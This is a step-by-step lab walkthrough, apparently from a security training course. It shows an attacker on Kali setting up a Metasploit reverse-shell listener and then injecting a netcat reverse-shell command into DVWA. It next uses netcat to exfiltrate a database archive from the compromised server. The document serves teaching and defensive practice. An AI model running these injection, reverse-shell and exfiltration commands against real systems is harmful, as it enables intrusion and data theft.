Reverse Shell
=============

A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the attacker’s host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. Reverse shells can also work across a NAT or firewall.

#. Running a Command-and-Control Server in Kali
     In the Kali Web Shell run the command:

     .. code-block::

       msfconsole

     .. image:: ../images/Attacks/Picture12.png
          :width: 450
#. Running a ‘reverse-shell’ module on Kali
     In the Kali Web Shell run the command:

     .. code-block::

       use exploit/multi/handler
       set PAYLOAD linux/x64/shell/reverse_tcp
       set LHOST 10.1.50.8
       run
      
     .. image:: ../images/Attacks/Picture13.png
          :width: 550
#. Run reverse shell command from DVWA
     In the XRDP Web Browser for DVWA run the command:

     .. code-block::

       | nc 10.1.50.8 4444 -e /bin/sh &

     .. image:: ../images/Attacks/Picture14.png
          :width: 850
#. Execute shell commands from Kali
     In the Kali Web Shell **Press Enter 1x prior to running commands**
  
     .. code-block::

       pwd
       ls -AlFh

     .. image:: ../images/Attacks/Picture15.png
          :width: 500
#. Open a New Web Shell in Kali

     .. image:: ../images/Attacks/Picture16.png
          :width: 600
#. Setup Data Exfiltration from Kali (2nd Web Shell [New Shell Window])

     .. code-block::

       cd /home/kali
       ls
       rm Sample-DB.zip
       nc -l -p 8888 > Sample-DB.zip

     .. image:: ../images/Attacks/Picture17.png
          :width: 850
#. Run Data Exfiltration command from Kali (1st Web Shell [Reverse Shell Window])

     .. code-block::

       nc -w 3 10.1.50.8 8888 < Sample-DB.zip

     .. image:: ../images/Attacks/Picture18.png
          :width: 600
#. Check Exfiltrated file on Kali from the compromised server (2nd Web Shell [New Shell Window])
     If file has size (~93MB) then the data exfiltration was successful

     .. code-block::

       ls -AlFh |grep -I Sample

     .. image:: ../images/Attacks/Picture19.png
          :width: 500